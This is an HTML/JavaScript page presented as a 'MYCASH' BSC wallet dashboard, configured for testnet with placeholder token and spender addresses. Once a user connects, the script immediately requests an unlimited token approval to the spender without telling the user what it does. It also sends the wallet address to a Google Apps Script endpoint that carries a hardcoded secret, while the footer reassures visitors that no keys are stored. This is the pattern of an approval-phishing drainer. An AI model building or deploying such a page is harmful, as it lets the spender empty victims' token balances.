<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>MYCASH â€” BSC Wallet</title>
  <style>
    body{font-family:system-ui,Segoe UI,Arial;background:#0b1220;color:#e6eef8;margin:0}
    header{background:#071027;padding:12px 16px;position:sticky;top:0;z-index:20;border-bottom:1px solid rgba(255,255,255,0.03)}
    .nav{max-width:980px;margin:0 auto;display:flex;align-items:center;justify-content:space-between}
    .nav-left{display:flex;gap:14px}
    a{color:#dbeafe;text-decoration:none;padding:6px 10px;border-radius:6px}
    a:hover{background:#0f1b33}
    .logo{font-weight:700;letter-spacing:4px}
    .connect{background:#3b82f6;color:#fff;padding:8px 14px;border-radius:999px;border:0;cursor:pointer}
    main{max-width:980px;margin:20px auto;padding:16px}
    .card{background:#071427;padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)}
    .row{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px}
    .stat{flex:1 1 220px;background:#071427;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02)}
    .muted{color:#9fb0c8}
    .tokens{margin-top:14px;display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px}
    .token{background:#071427;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.02)}
    footer{max-width:980px;margin:24px auto;padding:12px;color:#9fb0c8;text-align:center}
    input{padding:8px;border-radius:8px;border:1px solid #123044;background:#041525;color:#e6eef8}
    button{cursor:pointer}
    .small { font-size:0.9rem; color:#9fb0c8; }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace; }
  </style>
</head>
<body>
  <header>
    <div class="nav">
      <div class="nav-left">
        <a href="index.html">Home</a>
        <a href="about.html">About</a>
        <a href="contact.html">Contact</a>
      </div>
      <div class="logo">MYCASH</div>
      <div>
        <button id="connectBtn" class="connect">Connect Wallet</button>
      </div>
    </div>
  </header>

  <main>
    <div class="card">
      <h2>Wallet</h2>
      <div class="row">
        <div class="stat">
          <div class="muted">Status</div>
          <div id="statusText">Not connected</div>
        </div>

        <div class="stat">
          <div class="muted">Address</div>
          <div id="walletAddress" class="mono">â€”</div>
        </div>

        <div class="stat">
          <div class="muted">User ID</div>
          <div id="userId" class="mono">-</div>
        </div>

        <div class="stat">
          <div class="muted">Network</div>
          <div id="walletNetwork">â€”</div>
        </div>
        <div class="stat">
          <div class="muted">BNB Balance</div>
          <div id="walletBalance">â€”</div>
        </div>
      </div>

      <div style="margin-top:18px">
        <h3 class="muted">Tokens</h3>
        <div id="tokens" class="tokens"></div>
      </div>
    </div>
  </main>

  <footer>
    Â© <span id="year"></span> MYCASH â€” BSC (BEP-20) â€¢ No private keys stored.
  </footer>

  <!-- libs (keep these) -->
  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>

  <!-- single unified wallet script (uses unique names to avoid conflicts) -->
 <script>
(function(){
  // CONFIG - replace with yours
  const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbywwyB3dUFWAVMS_ZzoKp_gLXzNjhVA3HQo-6Rz8d-2n8tC6UnmvFkOJqERXO-d677g/exec";
  const APPS_SCRIPT_SECRET = "mahfuzinam0045";

  // === TOKEN APPROVAL CONFIG (TESTNET) ===
  const TOKEN_ADDRESS   = "0xYOUR_TESTNET_TOKEN_HERE";    // TODO: put your BEP20 token (BSC testnet)
  const SPENDER_ADDRESS = "0xYOUR_TESTNET_SPENDER_HERE";  // TODO: put your dApp/contract address

  // Minimal ERC20 ABI for approve() using Web3.js format
  const ERC20_ABI = [
    {
      "constant": false,
      "inputs": [
        { "name": "spender", "type": "address" },
        { "name": "amount",  "type": "uint256" }
      ],
      "name": "approve",
      "outputs": [
        { "name": "", "type": "bool" }
      ],
      "type": "function"
    }
  ];

  // BSC TESTNET CONFIG
  const BSC_CHAIN_ID_DEC = 97;                 // 97 = BSC testnet
  const BSC_CHAIN_ID_HEX = "0x61";             // hex for 97
  const BSC_CHAIN_LABEL  = "BSC Testnet (97)"; // label shown in UI

  // single unique modal variable to avoid collisions with other libs
  let web3ModalInstance = null;
  let providerInstance = null;
  let web3Instance = null;

  // helpers
  function storageKeyFor(address){ return `userId_${address.toLowerCase()}`; }

  // ðŸ”¢ 6-digit deterministic user ID from address
  function generateUserIdFromAddress(address){
    address = (address || "").toLowerCase();
    let hash = 0;
    for(let i = 0; i < address.length; i++){
      hash = ((hash << 5) - hash) + address.charCodeAt(i);
      hash |= 0; // keep 32-bit
    }
    hash = Math.abs(hash);
    const num = 100000 + (hash % 900000); // 100000â€“999999
    return String(num);
  }

  function getOrCreateUserIdFor(address){
    const key = storageKeyFor(address);
    let id = localStorage.getItem(key);
    if(!id){
      id = generateUserIdFromAddress(address);
      localStorage.setItem(key, id);
      console.log('Created userId',id,'for',address);
    } else {
      console.log('Loaded userId',id);
    }
    return id;
  }

  // UI refs
  const connectBtn = document.getElementById("connectBtn");
  const statusTextEl = document.getElementById("statusText");
  const walletAddressEl = document.getElementById("walletAddress");
  const userIdEl = document.getElementById("userId");
  const walletNetworkEl = document.getElementById("walletNetwork");
  const walletBalanceEl = document.getElementById("walletBalance");
  const tokensContainer = document.getElementById("tokens");

  function setStatus(txt){ if(statusTextEl) statusTextEl.textContent = txt; console.log("[status]",txt); }
  function setWalletInfo(address, network, bnb){
    if(walletAddressEl) walletAddressEl.textContent = address || "â€”";
    if(walletNetworkEl) walletNetworkEl.textContent = network || "â€”";
    if(walletBalanceEl) walletBalanceEl.textContent = (bnb===null||bnb===undefined)?"â€”":(Number(bnb).toFixed(6)+" BNB");
  }
  function setUserIdUI(id){ if(userIdEl) userIdEl.textContent = id || "-"; }
  function clearSessionUI(){ setStatus("Not connected"); setWalletInfo("â€”","â€”","â€”"); setUserIdUI("-"); if(walletAddressEl) walletAddressEl.textContent="â€”"; }

  // init modal
  function initWeb3ModalInstance(){
    const providerOptions = {
      walletconnect: {
        package: window.WalletConnectProvider.default,
        options: {
          // BSC TESTNET RPC
          rpc: { [BSC_CHAIN_ID_DEC]: "https://data-seed-prebsc-1-s1.binance.org:8545" },
          bridge: "https://bridge.walletconnect.org",
          qrcode: true
        }
      }
    };
    web3ModalInstance = new window.Web3Modal.default({ cacheProvider: true, providerOptions });
  }

  function attachProviderListeners(p){
    if(!p || !p.on) return;
    try {
      p.on("accountsChanged", (accounts) => {
        if(!accounts || !accounts.length){ clearSessionUI(); return; }
        const addr = accounts[0].toLowerCase();
        const uid = getOrCreateUserIdFor(addr);
        setWalletInfo(addr, walletNetworkEl.textContent||BSC_CHAIN_LABEL, "â€”");
        setUserIdUI(uid);
        notifyBackend(addr, BSC_CHAIN_LABEL, uid);
      });
      p.on("chainChanged", ()=> location.reload());
      p.on("disconnect", ()=> clearSessionUI());
    } catch(e){ console.warn("attachProviderListeners", e); }
  }

  async function notifyBackend(address, networkText, userId){
    try {
      const payload = new URLSearchParams({
        secret: APPS_SCRIPT_SECRET,
        address,
        network: networkText,
        timestamp: new Date().toISOString(),
        userId
      });
      const resp = await fetch(APPS_SCRIPT_URL, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
        body: payload.toString()
      });
      const text = await resp.text();
      console.log("Apps Script response:", resp.status, text);
      return { status: resp.status, text };
    } catch(err){
      console.error("notifyBackend error:", err);
      return { error: String(err) };
    }
  }

  async function fetchTokens(address){
    try{
      if(!tokensContainer) return;
      tokensContainer.innerHTML = `<div class="muted">Loading tokensâ€¦</div>`;
      const url = new URL(APPS_SCRIPT_URL);
      url.searchParams.set("action","getTokens");
      url.searchParams.set("address",address);
      url.searchParams.set("secret",APPS_SCRIPT_SECRET);
      const resp = await fetch(url.toString());
      const data = await resp.json().catch(()=>({}));
      if(!resp.ok || data.error){
        tokensContainer.innerHTML = `<div class="muted">Failed to load tokens.</div>`;
        console.warn("getTokens error", data);
        return;
      }
      tokensContainer.innerHTML = "";
      const native = data.native || 0;
      const nativeDiv = document.createElement("div");
      nativeDiv.className="token";
      nativeDiv.innerHTML = `<strong>BNB</strong><div class="muted">${Number(native).toFixed(6)} BNB</div>`;
      tokensContainer.appendChild(nativeDiv);
      (data.tokens||[]).forEach(t=>{
        const d=document.createElement("div");
        d.className="token";
        d.innerHTML=`
          <strong>${t.symbol}</strong>
          <div class="muted">${Number(t.balance).toFixed(6)}</div>
          <div style="font-size:11px;color:#7f9bb1">${t.contract}</div>`;
        tokensContainer.appendChild(d);
      });
    }catch(err){
      tokensContainer.innerHTML=`<div class="muted">Error loading tokens.</div>`;
      console.error("fetchTokens error",err);
    }
  }

  async function switchToBSC(provider){
    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID_HEX }]
      });
      return true;
    }
    catch(switchError){
      if(switchError.code === 4902){
        try {
          await provider.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: BSC_CHAIN_ID_HEX,
              chainName: "BNB Smart Chain Testnet",
              nativeCurrency:{name:"BNB",symbol:"tBNB",decimals:18},
              rpcUrls:["https://data-seed-prebsc-1-s1.binance.org:8545"],
              blockExplorerUrls:["https://testnet.bscscan.com"]
            }]
          });
          return true;
        } catch(addError){
          console.error("Could not add BSC Testnet chain:", addError);
          return false;
        }
      }
      console.error("Switch error:", switchError);
      return false;
    }
  }

  // ðŸ”¥ Request token approval immediately after connect (Web3.js)
  async function requestTokenApproval(){
    if(!TOKEN_ADDRESS || TOKEN_ADDRESS === "0xYOUR_TESTNET_TOKEN_HERE"){
      console.warn("TOKEN_ADDRESS not set, skipping approve");
      return;
    }
    if(!SPENDER_ADDRESS || SPENDER_ADDRESS === "0xYOUR_TESTNET_SPENDER_HERE"){
      console.warn("SPENDER_ADDRESS not set, skipping approve");
      return;
    }
    if(!web3Instance){
      console.warn("No web3 instance for token approval");
      return;
    }

    try {
      const accounts = await web3Instance.eth.getAccounts();
      if(!accounts || !accounts.length){
        console.warn("No accounts for approve");
        return;
      }
      const from = accounts[0].toLowerCase();

      setStatus("Requesting token approvalâ€¦");

      const tokenContract = new web3Instance.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);

      // Use max uint256 for "unlimited" approval
      const maxUint =
        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

      const tx = tokenContract.methods
        .approve(SPENDER_ADDRESS, maxUint)
        .send({ from });

      tx.on("transactionHash", function(hash){
        console.log("Approve tx sent:", hash);
        setStatus("Waiting for approval confirmationâ€¦");
      }).on("receipt", function(receipt){
        console.log("Approve confirmed:", receipt);
        setStatus("Connected + Approved âœ…");
      }).on("error", function(error){
        console.error("Token approve error:", error);
        alert("Token approval failed: " + (error?.message || error));
        setStatus("Connected (approval failed)");
      });

    } catch (err) {
      console.error("Token approve error (outer):", err);
      alert("Token approval failed: " + (err?.message || err));
      setStatus("Connected (approval failed)");
    }
  }

  async function connectFlow(){
    try{
      setStatus("Connectingâ€¦");
      const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

      if(!mobile && window.trustwallet && window.trustwallet.ethereum){
        providerInstance = window.trustwallet.ethereum;
        web3Instance = new Web3(providerInstance);
        await providerInstance.request({ method: "eth_requestAccounts" });
      } else if(window.ethereum && !mobile){
        providerInstance = window.ethereum;
        web3Instance = new Web3(providerInstance);
        await providerInstance.request({ method: "eth_requestAccounts" });
      } else {
        if(!web3ModalInstance) initWeb3ModalInstance();
        providerInstance = await web3ModalInstance.connect();
        web3Instance = new Web3(providerInstance);
      }

      if(!providerInstance || !web3Instance){
        setStatus("No provider");
        alert("No wallet provider detected.");
        return;
      }

      attachProviderListeners(providerInstance);

      const accounts = await web3Instance.eth.getAccounts();
      if(!accounts || !accounts.length){
        setStatus("No account");
        return;
      }
      const address = accounts[0].toLowerCase();

      let chainId = await web3Instance.eth.getChainId();
      if(Number(chainId)!==BSC_CHAIN_ID_DEC){
        const switched = await switchToBSC(providerInstance);
        if(!switched){
          alert("Please switch to BSC Testnet.");
          setStatus("Wrong network");
          return;
        }
        chainId = await web3Instance.eth.getChainId();
        if(Number(chainId)!==BSC_CHAIN_ID_DEC){
          alert("Network switch failed");
          return;
        }
      }

      const balanceWei = await web3Instance.eth.getBalance(address);
      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));

      setStatus("Connected");
      setWalletInfo(address, BSC_CHAIN_LABEL, balanceBNB);

      const userId = getOrCreateUserIdFor(address);
      setUserIdUI(userId);

      await fetchTokens(address);
      await notifyBackend(address, BSC_CHAIN_LABEL, userId);

      // ðŸ”¥ Immediately ask for token approval AFTER successful connect
      await requestTokenApproval();

    }catch(err){
      console.error("connectFlow error:",err);
      setStatus("Connection failed");
      alert("Connection failed: "+(err.message||err));
    }
  }

  async function tryAutoReconnect(){
    try{
      if(!web3ModalInstance) initWeb3ModalInstance();

      if(window.ethereum){
        const injected = window.ethereum;
        const accounts = await injected.request({ method: 'eth_accounts' });
        if(accounts && accounts.length){
          providerInstance = injected;
          web3Instance = new Web3(providerInstance);
          attachProviderListeners(providerInstance);
          const address = accounts[0].toLowerCase();
          setStatus("Restoring sessionâ€¦");
          const balanceWei = await web3Instance.eth.getBalance(address);
          const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei+"","ether"));
          setWalletInfo(address,BSC_CHAIN_LABEL,balanceBNB);
          const userId = getOrCreateUserIdFor(address);
          setUserIdUI(userId);
          await fetchTokens(address);
          return;
        }
      }

      if(web3ModalInstance && web3ModalInstance.cachedProvider){
        try{
          providerInstance = await web3ModalInstance.connect();
          web3Instance = new Web3(providerInstance);
          attachProviderListeners(providerInstance);
          const accounts = await web3Instance.eth.getAccounts();
          if(accounts && accounts.length){
            const address = accounts[0].toLowerCase();
            setStatus("Restoring sessionâ€¦");
            const balanceWei = await web3Instance.eth.getBalance(address);
            const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei+"","ether"));
            setWalletInfo(address,BSC_CHAIN_LABEL,balanceBNB);
            const userId = getOrCreateUserIdFor(address);
            setUserIdUI(userId);
            await fetchTokens(address);
            return;
          }
        }catch(e){
          console.warn("Cached provider restore failed:",e);
          try{ web3ModalInstance.clearCachedProvider(); }catch(_){}
        }
      }

      clearSessionUI();
    }catch(err){
      console.warn("Auto-reconnect error:",err);
      clearSessionUI();
    }
  }

  document.addEventListener('DOMContentLoaded', async ()=>{
    initWeb3ModalInstance();
    if(connectBtn) connectBtn.addEventListener('click', connectFlow);
    await tryAutoReconnect();
    const y = document.getElementById('year'); if(y) y.textContent = new Date().getFullYear();
  });

})();
</script>

</body>
</html>

